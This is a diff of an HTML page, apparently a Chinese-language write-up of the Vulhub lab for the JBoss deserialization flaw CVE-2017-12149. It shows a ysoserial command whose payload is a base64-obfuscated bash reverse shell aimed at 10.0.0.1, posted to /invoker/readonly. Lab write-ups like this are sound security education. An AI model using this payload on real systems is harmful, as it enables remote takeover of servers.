@@ -459,7 +459,9 @@
 <li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
 </ul>
 <h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><p>运行测试环境</p>
-<pre><code>docker-compose up -d</code></pre><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure>
+
+<p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p>
 <h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p>
 <p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/1.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/1.png" alt="img"></a></p>
 <p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p>
@@ -469,7 +471,9 @@
 <p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/2.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/2.png" alt="img"></a></p>
 <p><strong>序列化数据生成</strong></p>
 <p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
-<pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}&quot; &gt; poc.ser</code></pre><p><strong>发送POC</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>ysoserial.<span class="keyword">jar </span>CommonsCollections5 <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p><strong>发送POC</strong></p>
 <p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p>
 <p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/3.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/3.png" alt="img"></a></p>
 <p>成功反弹shell：</p>
